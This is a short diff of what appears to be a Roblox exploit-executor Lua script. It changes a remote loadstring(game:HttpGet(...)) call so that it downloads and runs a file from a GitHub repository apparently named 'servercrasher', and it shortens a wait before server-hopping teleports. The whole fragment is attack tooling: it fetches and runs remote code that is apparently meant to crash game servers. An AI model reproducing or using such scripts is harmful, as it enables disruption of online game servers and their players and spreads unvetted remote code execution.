@@ -29,10 +29,10 @@ if syn.queue_on_teleport then
 	end
 	
 
-loadstring(game:HttpGet("https://builderman.pro/pub/wtf.lua?raw=true", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/servercrasher/main/master.lua"))()
 
 
-    wait(100)
+    wait(40)
          if Decision == "any" then
                     game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[math.random(1,#GUIDs)].id, Player)
                 elseif Decision == "smallest" then
